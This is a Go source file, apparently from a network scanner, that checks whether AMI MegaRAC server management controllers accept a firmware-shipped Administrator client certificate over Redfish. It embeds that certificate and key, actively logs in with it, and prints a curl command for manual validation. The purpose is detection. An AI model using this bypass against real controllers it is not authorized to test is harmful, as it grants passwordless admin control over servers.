package check

import (
	"context"
	_ "embed"
	"fmt"
	"net"
	"net/http"
	"strconv"
	"strings"
	"time"

	"github.com/runZeroInc/excrypto/crypto/tls"
	"github.com/runZeroInc/oobscan/pkg/engine"
	"github.com/runZeroInc/oobscan/pkg/redfish"
	"github.com/runZeroInc/oobscan/pkg/tlscert"
)

// tls_mtls_check.go handles the AMI MegaRAC shipped-CA client-cert passwordless admin
// bypass: the Redfish TLS listener trusts the firmware-shipped CN=www.ami.com CA,
// whose private key ships in firmware and is byte-identical across OEMs, and maps
// ssl.verifyclient.username = SSL_CLIENT_S_DN_CN. Any cert signed by that CA
// authenticates as admin with no password.
//
// A finding is emitted only when the mTLS authentication actually succeeds against a
// credential-protected Redfish resource. Because presenting the cert is a login, the
// check is gated on !t.DisableLogins and does not run with login checks disabled.
func init() {
	Register(Check{
		Name:        "tls.mtls.ami.caBypass",
		Description: "AMI shipped-CA mutual-TLS bypass: CN=Administrator client cert authenticates passwordless admin over Redfish",
		Category:    "tls",
		Applies:     Applicability{CrossVendor: true},
		Enabled:     true,
		Run:         runAMIMTLSBypass,
	})
}

func runAMIMTLSBypass(ctx context.Context, t *engine.Target) []engine.Finding {
	if t == nil {
		return nil
	}
	to := max(t.Timeout, 4*time.Second)

	// The active client-cert presentation is an authenticated login; gate it on
	// the login-check opt-out. When disabled, this check reports nothing.
	if t.DisableLogins {
		return nil
	}

	// A BMC whose management web tier answers on 8443/4443 requests client certs
	// there, so assuming 443 misses it; but identify's port is not always the one
	// running mTLS either. Try the port identify settled on, then 443, and take the
	// first that asks for a client certificate.
	var (
		port int
		ci   *tlscert.CertInfo
	)
	for _, cand := range mtlsCandidatePorts(t) {
		got, err := tlscert.Inspect(t.Host, cand, to)
		if err != nil || got == nil || !got.ClientCertRequested {
			continue
		}
		port, ci = cand, got
		break
	}
	if ci == nil {
		// No TLS listener asked for a client certificate, so mutual TLS is not
		// enabled on any port worth probing.
		return nil
	}
	isAMI := (ci.SharedKeyMatch != nil && ci.SharedKeyMatch.Vendor == "ami") ||
		(ci.DefaultSubject != nil && ci.DefaultSubject.Vendor == "ami") ||
		ci.Vendor == "ami"
	if !isAMI {
		// Client-cert auth on a non-AMI BMC is a HARDENING feature, not a
		// vulnerability. It only becomes a bypass when the trusted client CA is a
		// public/shipped key, so a non-AMI mTLS listener yields no finding.
		return nil
	}

	// Actively present the shipped CN=Administrator client cert and confirm
	// authenticated access (differential vs. no-cert). A finding is warranted only
	// on a genuinely authenticated response.
	res := verifyAMIMTLSBypass(t.Host, port, to)
	if !res.Confirmed {
		// mTLS enabled on an AMI BMC, but the shipped cert did not authenticate
		// (patched build, custom trust store, or a non-default CA). Not a bypass.
		//
		// Say so: the finding only exists on the positive arm, so without this a
		// host that was measured and came back clean is indistinguishable in the
		// output from one the check never reached. The acceptable-CA names are the
		// discriminator between "the BMC does not trust the shipped CA" and "the
		// BMC trusts it but the cert was rejected".
		if t.DebugLog != nil {
			t.DebugLog(fmt.Sprintf("tls.mtls.ami.caBypass: measured port=%d clientCertRequested=true confirmed=false acceptableCAs=%v",
				port, ci.AcceptableCAs))
		}
		return nil
	}

	vendor := res.Info.Vendor
	if vendor == "" {
		vendor = "ami"
	}
	t.SetEvidence("redfish.postAuth", &redfish.PostAuthSnapshot{
		Method: "mtls",
		Via:    "mtls",
		User:   "Administrator",
		Source: "firmware-shipped-client-cert",
		Info:   res.Info,
	})
	return []engine.Finding{{
		Check: "tls.mtls.ami.caBypass", Category: "tls", Risk: "critical",
		Port: port, Transport: "tcp", Protocol: "https",
		Fields: engine.F(
			"mtls", "enabled",
			"username", "Administrator",
			"evidenceEndpoint", "/redfish/v1/AccountService/Accounts",
			"sessionAuthenticated", "true",
			"vendor", vendor,
			"model", res.Info.Model,
			"firmwareVersion", res.Info.FirmwareVersion,
			"redfishVersion", res.Info.RedfishVersion,
			"serviceUuid", res.Info.ServiceUUID,
			"product", res.Info.Product,
			"serial", res.Info.SerialNumber,
			"managerId", res.Info.ManagerID,
			"systemId", res.Info.SystemID,
			"biosVersion", res.Info.BIOSVersion,
			"powerState", res.Info.PowerState,
			"accountRole", res.Info.AccountRole,
			"accountEnabled", res.Info.AccountEnabled,
			"proof", res.Evidence,
		),
	}}
}

// ami_admin_client.pem is the CN=Administrator client certificate and RSA private key
// shipped in AMI MegaRAC firmware (usr/local/redfish/certs/user.pem), issued by the
// firmware CA CN=www.ami.com and byte-identical across AMI OEMs. Embedding it lets
// the check confirm the bypass instead of only flagging the precondition.
//
//go:embed ami_admin_client.pem
var amiAdminClientPEM []byte

// amiClientCert lazily parses the embedded Administrator client cert.
func amiClientCert() (tls.Certificate, bool) {
	c, err := tls.X509KeyPair(amiAdminClientPEM, amiAdminClientPEM)
	if err != nil {
		return tls.Certificate{}, false
	}
	return c, true
}

// amiMTLSClient builds the client that presents the shipped Administrator
// certificate. It does not reuse the shared BMC client, whose TLS posture drops
// this probe silently in two ways:
//
//   - a certificate held in tls.Config.Certificates is filtered against the
//     acceptable-CA list the server advertises in its CertificateRequest, so a BMC
//     naming an issuer that does not byte-match the shipped leaf receives no
//     certificate at all. The check then records "not vulnerable" for a host it
//     never presented the certificate to. GetClientCertificate always sends it and
//     leaves the accept/reject decision to the BMC, which is the thing being tested.
//   - the shared client leaves MinVersion at the library default, which excludes
//     TLS 1.0 and 1.1 on the client side, while the inspection that decided this
//     host requests client certs accepts them. On such a listener every follow-up
//     request fails the handshake and the probe reports nothing.
func amiMTLSClient(cert tls.Certificate, timeout time.Duration) *http.Client {
	if timeout <= 0 {
		timeout = 4 * time.Second
	}
	phase := min(timeout, 5*time.Second)
	dialer := &net.Dialer{Timeout: phase, KeepAlive: -1}
	cfg := &tls.Config{
		InsecureSkipVerify: true, //nolint:gosec // BMCs ship self-signed certs; scanning, not trusting.
		MinVersion:         tls.VersionTLS10,
		GetClientCertificate: func(*tls.CertificateRequestInfo) (*tls.Certificate, error) {
			return &cert, nil
		},
	}
	tlsDialer := &tls.Dialer{NetDialer: dialer, Config: cfg}
	return &http.Client{
		Timeout: timeout,
		Transport: &http.Transport{
			DisableKeepAlives:     true,
			DialContext:           dialer.DialContext,
			DialTLSContext:        tlsDialer.DialContext,
			ForceAttemptHTTP2:     false,
			TLSHandshakeTimeout:   phase,
			ResponseHeaderTimeout: phase,
			MaxConnsPerHost:       2,
		},
		// Do not follow a redirect to a login page as if it were success.
		CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse },
	}
}

// amiMTLSResult carries the outcome of the active mutual-TLS confirmation.
type amiMTLSResult struct {
	Confirmed bool               // the shipped cert authenticated as admin
	Info      redfish.SystemInfo // vendor/model/fw pulled from the authenticated session
	Evidence  string             // short snippet of the authenticated Redfish body
}

// verifyAMIMTLSBypass actively confirms the AMI shipped-CA mutual-TLS bypass by
// presenting the embedded CN=Administrator client cert to a credential-protected
// Redfish resource; a 2xx with a real Redfish body proves passwordless admin. The
// same request without the client cert must be denied first, so a Redfish root that
// is simply readable pre-auth is not misreported. Only Confirmed warrants a finding.
func verifyAMIMTLSBypass(host string, port int, timeout time.Duration) amiMTLSResult {
	cert, ok := amiClientCert()
	if !ok {
		return amiMTLSResult{}
	}
	base := redfish.BaseURL(host, port)

	// Baseline with no client cert: an admin resource must be denied for the
	// differential to hold. If it is readable with no cert we cannot attribute a
	// success to the mTLS bypass, so we do not report.
	noCert := redfish.InsecureClient(timeout)
	if authed, _ := redfish.AuthedResource(noCert, base, nil, timeout); authed {
		return amiMTLSResult{}
	}

	// WITH the shipped Administrator client cert.
	withCert := amiMTLSClient(cert, timeout)
	authed, body := redfish.AuthedResource(withCert, base, nil, timeout)
	if !authed {
		return amiMTLSResult{} // cert did not authenticate; no finding
	}

	// Authenticated: pull post-auth inventory over the same mTLS session to prove and
	// enrich the access (the transport carries the identity, so no token headers).
	info := redfish.PullSystemInfo(withCert, base, nil, "Administrator", timeout)
	return amiMTLSResult{Confirmed: true, Info: info, Evidence: proofKV("auth", "mtls", "resource", "admin", "bodyBytes", strconv.Itoa(len(body)))}
}

func init() {
	RegisterExplain("tls.mtls.ami.caBypass", explainAMIMTLSBypass)
}

func explainAMIMTLSBypass(host string, f engine.Finding) string {
	model := explainField(f, "model")
	fw := explainField(f, "firmwareVersion")
	evidence := explainField(f, "proof")
	var b strings.Builder
	b.WriteString(explainHeading(host, f))
	b.WriteString("\nThe BMC trusts the AMI firmware CA (`CN=www.ami.com`) whose private key is\n")
	b.WriteString("byte-identical across all AMI OEM boards and is public (extracted from firmware).\n")
	b.WriteString("Presenting the shipped `CN=Administrator` client cert authenticates as admin.\n")
	if model != "" || fw != "" {
		b.WriteString(fmt.Sprintf("\n**Device:** %s firmware %s\n", model, fw))
	}
	if evidence != "" {
		b.WriteString(fmt.Sprintf("**Proof:** `%s`\n", evidence))
	}
	b.WriteString("\n**Validate with the shipped cert:**\n")
	b.WriteString(explainSh(
		"# Cert: usr/local/redfish/certs/user.pem from AMI firmware (CN=Administrator, CA=CN=www.ami.com)",
		`curl -sk --cert ami_admin_client.pem --key ami_admin_client.pem \`,
		fmt.Sprintf(`  https://%s/redfish/v1/AccountService/Accounts | python3 -m json.tool`, host),
	))
	b.WriteString("\n\n**Impact:** Passwordless admin Redfish access -- power control, user management,\n")
	b.WriteString("firmware update, virtual media, and SOL.\n")
	return b.String()
}

// mtlsCandidatePorts lists the TLS ports worth checking for a client-cert request,
// most-likely first: the HTTPS port identify settled on, then 443. Either alone
// misses hosts -- identify's port can be a non-mTLS listener, and a management tier
// on 8443 is invisible to a hardcoded 443.
func mtlsCandidatePorts(t *engine.Target) []int {
	out := make([]int, 0, 2)
	if p := webPort(t); p > 0 {
		out = append(out, p)
	}
	if len(out) == 0 || out[0] != 443 {
		out = append(out, 443)
	}
	return out
}
